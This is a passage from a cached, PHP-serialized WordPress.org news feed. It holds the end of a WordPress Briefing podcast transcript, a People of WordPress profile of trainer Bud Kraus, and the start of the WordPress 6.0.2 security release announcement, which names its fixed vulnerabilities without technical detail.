don&#8217;t speak English, you cannot learn here?</p>\n\n\n\n<p>Like that&#8217;s not fair.</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:11:45]</strong></p>\n\n\n\n<p>No.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:11:46]&nbsp;</strong></p>\n\n\n\n<p>We want everyone to be able to learn here in their own languages, and yeah. That&#8217;s just a living, breathing issue with a global project, I think.&nbsp;</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:11:56]</strong></p>\n\n\n\n<p>Yeah.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:11:57]</strong></p>\n\n\n\n<p>Now that we left us on like a really juicy topic, just the lightest thing we could find. Is there anything else that you wanna be sure to share with the WordPress Briefing listeners before we head out?</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:12:10]</strong></p>\n\n\n\n<p>Come and join the training team. Like I said, you don&#8217;t have to be a trainer. You can come in, and help us take notes. You can come in and edit, and review. If you are a subject matter expert, we also have the <a href=\"https://make.wordpress.org/training/handbook/faculty-program/\">faculty program</a>, which was launched. Was it a month ago now?</p>\n\n\n\n<p>Sorry. Days, months, weeks merge for me these days. But yeah, so that&#8217;s like a dedicated volunteer team. And in there, we&#8217;ve got content creators, editors, subject matter experts, and just admin stuff. If you wanna help us with the admin stuff. If you&#8217;re a GitHub guru, get in touch cause we are trying to automate some of our processes, and we could use the help, but yeah, just come join us.</p>\n\n\n\n<p>Join one of our meetings, which run on Tuesdays at 7 AM UTC and 4:00 PM UTC.&nbsp;</p>\n\n\n\n<p>Yes, that&#8217;s right. I get my time right.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:13:03]&nbsp;</strong></p>\n\n\n\n<p>If it&#8217;s not right, we&#8217;ll put it. We&#8217;ll correct it in the show notes.&nbsp;</p>\n\n\n\n<p>Also, if you are not necessarily familiar with the WordPress project and how to get started with contributions, you can find the training team and a lot of information about them and all the other teams on make.wordpress.org.</p>\n\n\n\n<p>I will share that in the show notes as well. make.wordpress.org/training is where you can find Hauwa&#8217;s team. Hauwa, thank you again for joining me today.</p>\n\n\n\n<p><strong>[Hauwa Abashiya 00:13:30]</strong></p>\n\n\n\n<p>No, thank you for having me. It&#8217;s just a wonderful treat. I get to listen to you, and now I get to be on it.&nbsp;</p>\n\n\n\n<p>So, yeah, it&#8217;s good.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:13:37]</strong></p>\n\n\n\n<p>I hope that some of you feel inspired to stop by and see what the team is up to learn something new about WordPress or contribute a little something yourself. And with that, I&#8217;ll bring us home with the small list of big things. First thing, there was a freshly pressed minor release last week. You probably didn&#8217;t notice it.</p>\n\n\n\n<p>It probably went quite smoothly in the background and never interrupted you at all. However, if you want to read what was in it, you can head to wordpress.org/news now, or click on the link in the show notes.&nbsp;</p>\n\n\n\n<p>Second thing, is that coming up at the end of this week, September 9th, 2022, WordCamp US is back and ready to help broaden your WordPress knowledge. If you will be there, I hope it is a wonderful time, but if you won&#8217;t be there in person, I&#8217;ll include a link to register for the live stream, or you can watch all of those sessions afterward on wp.tv or the WordPress YouTube channel.</p>\n\n\n\n<p>Third thing on our list of small list of big things is that WordPress Translation Day is coming up. That&#8217;s normally at the end of September, it coincides with a global day of appreciation for translators just generally across the world. And so that is coming, it&#8217;s normally around the 28th or so.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:14:55]</strong></p>\n\n\n\n<p>So put that in your calendars. As soon as I have any information, as soon as I have a link to share with you all, I will have that for you as well.&nbsp;</p>\n\n\n\n<p>And the final thing on my list today is that if you are hoping to speak at WordCamp Asia, 2023, you have 10 more days, September 15th, 2022**, to apply for that.</p>\n\n\n\n<p>We need topics of all sorts, from security hardening and backend development to entrepreneurial best practices, WordPress out of the box all the way back around to the importance of securing open source freedom. Even when people don&#8217;t know they need them. If you&#8217;ve got something you&#8217;re a bit passionate about, something that you are a passionate expert about especially, we want to see your application. And that, my friends, is your small list of big things.</p>\n\n\n\n<p>Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And I&#8217;ll see you again in a couple of weeks.</p>\n\n\n\n<p><br>** <em><strong>Special note: the deadline to apply as a speaker to WordCamp Asia was extended to September 30th, 2022, after the recording of this episode.</strong></em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13425\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:14;a:6:{s:4:\"data\";s:72:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:30:\"People of WordPress: Bud Kraus\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:65:\"https://wordpress.org/news/2022/08/people-of-wordpress-bud-kraus/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Wed, 31 Aug 2022 21:30:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:6:{i:0;a:5:{s:4:\"data\";s:9:\"Community\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Features\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:7:\"General\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:10:\"Interviews\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:9:\"HeroPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:5;a:5:{s:4:\"data\";s:19:\"People of WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13385\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:135:\"The latest People of WordPress story features trainer Bud Kraus, from the United States, talking about the software and how he uses it.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:28:\"webcommsat AbhaNonStopNewsUK\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:14109:\"\n<p><strong>This month, as we approach <a href=\"https://us.wordcamp.org/2022/\">WordCamp US</a>, we feature Bud Kraus, a WordPress trainer who has made a career in helping others learn about software. He also shares how he has developed an approach to using technology in order to overcome longstanding difficulties with his eyesight.</strong></p>\n\n\n\n<p><strong>In this People of WordPress series, we share some of the inspiring stories of how WordPress and its global network of contributors can change people’s lives for the better.</strong></p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"1014\" height=\"627\" src=\"https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-aug-powp.jpg?resize=1014%2C627&#038;ssl=1\" alt=\"Bud Kraus playing the guitar\" class=\"wp-image-13341\" srcset=\"https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-aug-powp.jpg?w=1014&amp;ssl=1 1014w, https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-aug-powp.jpg?resize=300%2C186&amp;ssl=1 300w, https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-aug-powp.jpg?resize=768%2C475&amp;ssl=1 768w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>Bud Kraus</em> with his guitar</figcaption></figure>\n\n\n\n<h2>Teaching WordPress strengthens your understanding</h2>\n\n\n\n<p>Bud has taught web design since 1998, with students from more than 80 countries online or in person. He was determined not to let his sight difficulties stop him from his wish to  help others learn website building and maintenance skills.   </p>\n\n\n\n<p>As WordPress evolves and new features release, Bud decided to extend his training services around helping new and existing users improve and practice their skills. He supports others in open source through volunteering to speak at WordPress events, and encourages others to do so too. He also gives time to help produce material for the free-to-access resource <a href=\"https://learn.wordpress.org/\">Learn WordPress,</a> which is part of the WordPress.org project.&nbsp;</p>\n\n\n\n<p>As a contributor to the <a href=\"https://make.wordpress.org/test/\">Test</a> and <a href=\"https://make.wordpress.org/training/\">Training</a> teams, Bud is keen for others to try contributing to these areas and help support the project&#8217;s future development. One of his current training priorities is to help people with using the block editor and Full Site Editing. He is an advocate for the usability of WordPress today, saying: “I can design all aspects of a website now with a block.”</p>\n\n\n\n<h2>Using WordPress as a traditional developer</h2>\n\n\n\n<p>Bud’s WordPress journey began with a lunch at Grand Central Station in New York in 2009. A friend and former client was promoting the idea of using WordPress, which Bud initially resisted.</p>\n\n\n\n<p>“I’m a code guy…,” he told his friend at the time. “I will never use anything like that.”</p>\n\n\n\n<p>However, the friend persisted. Eventually, Bud gave it a try and found a new approach with things called themes and plugins. His first encounter was with <a href=\"https://wordpress.org/download/releases/\">WordPress 2.6</a>. Bud signed up with a hosting company and found a theme where he could learn to edit and understand child themes.</p>\n\n\n\n<p>He said: &#8220;Once I saw that you could edit anything and make it yours, I was hooked. The endorphins were freely coursing through my veins.&#8221; Bud was hooked.</p>\n\n\n\n<h2>Teaching WordPress strengthens your own understanding of the software</h2>\n\n\n\n<p>There’s an old saying that the best way to learn something new is to turn around and teach someone else.</p>\n\n\n\n<p>Bud was already an instructor at the Fashion Institute of Technology when he thought, “I could teach WordPress!”</p>\n\n\n\n<p>And so he did, packing classrooms all through those first years of WordPress as it swept through the design world and further.<br><br>But Bud had more to discover. He said: &#8220;Two big things were about to happen that were really going to change my life. They would show me the way to the WordPress community – not that I even knew what that was.&#8221;</p>\n\n\n\n<h2>Sharing lessons learnt with the WordPress community</h2>\n\n\n\n<p>In 2014, one of his students suggested he start going to the New York WordPress Meetup.&nbsp;</p>\n\n\n\n<p>As he started going to WordCamps in New York City, he realized that WordPress was getting very large. What’s more, it had a community of people with whom he felt at home and could learn alongside.</p>\n\n\n\n<p>Bud gave a talk for the first time in 2016 at the only WordCamp to this day that has been held at the United Nations. He shared his knowledge of “Lessons Learned: Considerations For Teaching Your Clients WordPress.”&nbsp;</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"952\" height=\"1024\" src=\"https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-1.jpg?resize=952%2C1024&#038;ssl=1\" alt=\"Bud Kraus talking at a WordCamp\" class=\"wp-image-13340\" srcset=\"https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-1.jpg?w=952&amp;ssl=1 952w, https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-1.jpg?resize=279%2C300&amp;ssl=1 279w, https://i2.wp.com/wordpress.org/news/files/2022/08/bud-kraus-1.jpg?resize=768%2C826&amp;ssl=1 768w\" sizes=\"(max-width: 952px) 100vw, 952px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>Bud Kraus speaks at WordCamps to help people use the software even more effectively</em></figcaption></figure>\n\n\n\n<p>From there, Bud went on to speak at other WordCamps in the US. He also volunteered as a speaker wrangler for his home camp in New York City in 2018 and 2019.</p>\n\n\n\n<h2>From speaking to writing about WordPress</h2>\n\n\n\n<p>At some point before the Covid-19 lockdown, Bud found another outlet, this time in writing.&nbsp;</p>\n\n\n\n<p>Bud heard a magazine was advertising for submissions related to WordPress.&nbsp;His first attempted article did not make the cut.</p>\n\n\n\n<p>So in his second submission, Bud took the risk of writing about something deeply personal – a topic he really didn’t want to write about at all.</p>\n\n\n\n<p>He gathered his courage and revealed to the entire web design world that he was legally blind.</p>\n\n\n\n<p>The article appeared as&nbsp; <strong>“</strong><a href=\"https://www.smashingmagazine.com/2018/05/using-low-vision-teach-wordpress/\"><strong>Using Low Vision As My Tool To Help Me Teach WordPress</strong></a><strong>”.</strong></p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"510\" height=\"600\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/09/bud-kraus-2.jpg?resize=510%2C600&#038;ssl=1\" alt=\"Bud Kraus\" class=\"wp-image-13426\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/09/bud-kraus-2.jpg?w=510&amp;ssl=1 510w, https://i0.wp.com/wordpress.org/news/files/2022/09/bud-kraus-2.jpg?resize=255%2C300&amp;ssl=1 255w\" sizes=\"(max-width: 510px) 100vw, 510px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\">Bud Kraus</figcaption></figure>\n\n\n\n<p>Since the age of 37, Bud has had macular degeneration in both eyes, which affects his central vision. It is a leading cause of legal blindness in the United States and many other countries.&nbsp;</p>\n\n\n\n<p>He relies on his peripheral vision and finding ways to compensate. He also tends to see things in a flat dimension and has a difficulty discerning contrast&nbsp; &#8211; he&nbsp; is glad there are starting to be improvements in color contrasts in web design!<br><br>He uses tools like Speech to Text, larger sized cursors and bigger font sizes, and heavily uses zooming back in and out when working with WordPress. He is able to recognize patterns but has to rely on detailed preparation and memorizing materials.&nbsp;</p>\n\n\n\n<p>In his first magazine article acknowledging this situation, he shared the added difficulties that technology creates for people with visual conditions, and tips that he had found to try and find alternative routes around them. He uses the technique of finding alternatives in his training work to help people learn and understand, realizing that all people have different ways of reading and understanding. His words and subsequent stories have inspired others and enabled more people to highlight accessibility. He describes himself as a ‘stakeholder in ensuring that the WordPress admin is accessible.’</p>\n\n\n\n<p>A year after its first publication, the piece became a WordCamp talk, ‘My Way with WordPress.’ The talk was a hit and started many conversations about accessibility and the importance of raising awareness.</p>\n\n\n\n<p>A few months later, he gave a Gutenberg talk at the first WordCamp Montclair. There was no way he could have done it from a laptop, so instead, he did it from his 27” desktop computer. </p>\n\n\n\n<p>Bud said: &#8220;It was a presentation on Gutenberg plugins. Since I couldn’t do this from a notebook screen (the screen is too small and the keyboard is hard for me to manipulate), it was decided that I would bring in my 27″ desktop machine to a WordCamp. I’m probably the first person to ever have done this. It was good thing I only lived a few miles away.&#8221;</p>\n\n\n\n<p>He added: “I sat behind my computer, did my thing, and every once in a while peered out to make sure people were still there.”</p>\n\n\n\n<h2>Different ways of contributing to WordPress</h2>\n\n\n\n<p>One of the main ways Bud supported the community around the software was through talks at WordCamps and helping others to speak. </p>\n\n\n\n<p>During the Covid-19 pandemic, he was keen to continue contributing when WordCamps were no longer meeting in person. He turned greater attention to supporting the <a href=\"https://learn.wordpress.org/\">Learn WordPress</a> resource, a free to use learning platform made by and for the community itself.&nbsp;</p>\n\n\n\n<p>More training materials on the block editor can be found on Learn WordPress and his WordCamp talks are available on <a href=\"https://wordpress.tv/?s=kraus&amp;speakers=bud-kraus\">WordPress.tv</a>.</p>\n\n\n\n<h2>Global reach and meaning through WordPress</h2>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"600\" height=\"800\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/08/bud-kraus-with-josepha.jpg?resize=600%2C800&#038;ssl=1\" alt=\"Bud Kraus with Josepha\" class=\"wp-image-13342\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/08/bud-kraus-with-josepha.jpg?w=600&amp;ssl=1 600w, https://i0.wp.com/wordpress.org/news/files/2022/08/bud-kraus-with-josepha.jpg?resize=225%2C300&amp;ssl=1 225w\" sizes=\"(max-width: 600px) 100vw, 600px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>Bud Kraus with Josepha Haden Chomphosy at WordCamp Montclair, NJ 2022</em></figcaption></figure>\n\n\n\n<p>Bud’s training materials and willingness to talk about accessibility have helped so many people find their way with WordPress. He in turn is an advocate for the community around open source.</p>\n\n\n\n<p>He said: “The software is really good, and the people are even better.” &nbsp;</p>\n\n\n\n<p>He added: “I get a sense of accomplishment whenever I launch a new or redesigned site. It’s also given me a great feeling to know that many people have learned WordPress around the world from my <a href=\"https://wordpress.tv/?s=kraus&amp;speakers=bud-kraus\">talks and presentations</a>. This might just be the most gratifying thing of all.”</p>\n\n\n\n<h2>Share the stories</h2>\n\n\n\n<p>Help share these stories of open source contributors and continue to grow the community. Meet more WordPressers in the <a href=\"https://wordpress.org/news/category/newsletter/interviews/\">People of WordPress series</a>.</p>\n\n\n\n<h2>Contributors</h2>\n\n\n\n<p>Thanks to Abha Thakor (<a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>), Mary Baum (<a href=\'https://profiles.wordpress.org/marybaum/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>marybaum</a>), Surendra Thakor (<a href=\'https://profiles.wordpress.org/sthakor/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>sthakor</a>), Meher Bala (<a href=\'https://profiles.wordpress.org/meher/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>meher</a>), Larissa Murillo (<a href=\'https://profiles.wordpress.org/lmurillom/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>lmurillom</a>), and Chloe Bringmann (<a href=\'https://profiles.wordpress.org/cbringmann/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>cbringmann</a>), for work on this feature. Thank you too to Bud Kraus (<a href=\'https://profiles.wordpress.org/trynet/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>trynet</a>) for sharing his experiences.</p>\n\n\n\n<p>Thank you to Josepha Haden (<a href=\'https://profiles.wordpress.org/chanthaboune/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chanthaboune</a>) and Topher DeRosia (<a href=\'https://profiles.wordpress.org/topher1kenobe/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>topher1kenobe</a>) for their support of the <em>People of WordPress</em> series.</p>\n\n\n\n<div class=\"wp-block-media-text is-stacked-on-mobile is-vertically-aligned-center\" style=\"grid-template-columns:29% auto\"><figure class=\"wp-block-media-text__media\"><img decoding=\"async\" loading=\"lazy\" width=\"180\" height=\"135\" src=\"https://i1.wp.com/wordpress.org/news/files/2020/03/heropress_logo_180.png?resize=180%2C135&#038;ssl=1\" alt=\"HeroPress logo\" class=\"wp-image-8409 size-full\" data-recalc-dims=\"1\" /></figure><div class=\"wp-block-media-text__content\">\n<p class=\"has-small-font-size\"><em>This People of WordPress feature is inspired by an essay originally published on </em><a href=\"https://heropress.com/\"><em>HeroPress.com</em></a><em>, a community initiative created by Topher DeRosia. It highlights people in the WordPress community who have overcome barriers and whose stories might otherwise go unheard. </em>#HeroPress </p>\n</div></div>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13385\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:15;a:6:{s:4:\"data\";s:72:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:48:\"WordPress 6.0.2 Security and Maintenance Release\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:84:\"https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 30 Aug 2022 19:39:47 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:6:{i:0;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Security\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.0\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:5:\"6.0.2\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:14:\"minor-releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:5;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13346\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:299:\"WordPress 6.0.2 is now available for download. This security and maintenance release features several updates since WordPress 6.0.1 in July 2022. You can review a summary of the key changes in this release by visiting https://make.wordpress.org/core/2022/08/23/wordpress-6-0-2-rc1-is-now-available/.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:11:\"Dan Soschin\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:5702:\"\n<p><strong>WordPress 6.0.2</strong> is now available!</p>\n\n\n\n<p>This security and maintenance release features <a href=\"https://core.trac.wordpress.org/query?milestone=6.0.2\">12 bug fixes on Core</a>, <a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.0\">5 bug fixes</a> for the Block Editor, and 3 security fixes. Because this is a <strong>security release</strong>, it is recommended that you update your sites immediately. All versions since WordPress 3.7 have also been updated.</p>\n\n\n\n<p>WordPress 6.0.2 is a short-cycle release. You can review a summary of the main updates in this release by reading the <a href=\"https://make.wordpress.org/core/2022/08/23/wordpress-6-0-2-rc1-is-now-available/\">RC1 announcement</a>.</p>\n\n\n\n<p>The next major release will be <a href=\"https://make.wordpress.org/core/6-1/\">version 6.1</a> planned for November 1, 2022.</p>\n\n\n\n<p>If you have sites that support automatic background updates, the update process will begin automatically.</p>\n\n\n\n<p>You can <a href=\"https://wordpress.org/wordpress-6.0.2.zip\">download WordPress 6.0.2 from WordPress.org</a>, or visit your WordPress Dashboard, click “Updates”, and then click “Update Now”.</p>\n\n\n\n<p>For more information on this release, please <a href=\"https://wordpress.org/support/wordpress-version/version-6-0-2\">visit the HelpHub site</a>.</p>\n\n\n\n<h2>Security updates included in this release</h2>\n\n\n\n<p>The security team would like to thank the following people for responsibly reporting vulnerabilities, and allowing them to be fixed in this release:</p>\n\n\n\n<ul>\n<li>Fariskhi Vidyan for finding a possible SQL injection within the Link API.</li>\n\n\n\n<li><a href=\"https://hackerone.com/entropy1337\">Khalilov Moe</a> for finding an XSS vulnerability on the Plugins screen.</li>\n\n\n\n<li><a href=\"https://profiles.wordpress.org/johnbillion/\">John Blackbourn</a> of the WordPress security team, for finding an output escaping issue within <code>the_meta()</code>.</li>\n</ul>\n\n\n\n<h2>Thank you to these WordPress contributors</h2>\n\n\n\n<p>The WordPress 6.0.2 release was led by <a href=\"https://profiles.wordpress.org/sergeybiryukov/\">@sergeybiryukov</a> and <a href=\"https://profiles.wordpress.org/gziolo/\">@gziolo</a>.</p>\n\n\n\n<p>WordPress 6.0.2 would not have been possible without the contributions of more than 50 people. Their asynchronous coordination to deliver several enhancements and fixes into a stable release is a testament to the power and capability of the WordPress community.</p>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/xknown/\">Alex Concha</a>,&nbsp;<a href=\"https://profiles.wordpress.org/andraganescu/\">Andrei Draganescu</a>,&nbsp;<a href=\"https://profiles.wordpress.org/annezazu/\">annezazu</a>,&nbsp;<a href=\"https://profiles.wordpress.org/antonvlasenko/\">Anton Vlasenko</a>,&nbsp;<a href=\"https://profiles.wordpress.org/aristath/\">Ari Stathopoulos</a>,&nbsp;<a href=\"https://profiles.wordpress.org/scruffian/\">Ben Dwyer</a>,&nbsp;<a href=\"https://profiles.wordpress.org/poena/\">Carolina Nymark</a>,&nbsp;<a href=\"https://profiles.wordpress.org/costdev/\">Colin Stewart</a>,&nbsp;<a href=\"https://profiles.wordpress.org/uofaberdeendarren/\">Darren Coutts</a>,&nbsp;<a href=\"https://profiles.wordpress.org/dilipbheda/\">Dilip Bheda</a>,&nbsp;<a href=\"https://profiles.wordpress.org/dd32/\">Dion Hulse</a>,&nbsp;<a href=\"https://profiles.wordpress.org/martinkrcho/\">eMKey</a>,&nbsp;<a href=\"https://profiles.wordpress.org/fabiankaegy/\">Fabian Kägy</a>,&nbsp;<a href=\"https://profiles.wordpress.org/mamaduka/\">George Mamadashvili</a>,&nbsp;<a href=\"https://profiles.wordpress.org/gziolo/\">Greg Ziółkowski</a>,&nbsp;<a href=\"https://profiles.wordpress.org/huubl/\">huubl</a>,&nbsp;<a href=\"https://profiles.wordpress.org/ironprogrammer/\">ironprogrammer</a>,&nbsp;<a href=\"https://profiles.wordpress.org/audrasjb/\">Jb Audras</a>,&nbsp;<a href=\"https://profiles.wordpress.org/johnbillion/\">John Blackbourn</a>,&nbsp;<a href=\"https://profiles.wordpress.org/desrosj/\">Jonathan Desrosiers</a>,&nbsp;<a href=\"https://profiles.wordpress.org/jonmackintosh/\">jonmackintosh</a>,&nbsp;<a href=\"https://profiles.wordpress.org/spacedmonkey/\">Jonny Harris</a>, <a href=\"https://profiles.wordpress.org/ryelle/\">Kelly Choyce-Dwan</a>,&nbsp;<a href=\"https://profiles.wordpress.org/0mirka00/\">Lena Morita</a>,&nbsp;<a href=\"https://profiles.wordpress.org/rudlinkon/\">Linkon Miyan</a>,&nbsp;<a href=\"https://profiles.wordpress.org/lovor/\">Lovro Hrust</a>,&nbsp;<a href=\"https://profiles.wordpress.org/marybaum/\">marybaum</a>,&nbsp;<a href=\"https://profiles.wordpress.org/ndiego/\">Nick Diego</a>,&nbsp;<a href=\"https://profiles.wordpress.org/ntsekouras/\">Nik Tsekouras</a>, <a href=\"https://profiles.wordpress.org/oglekler/\">Olga 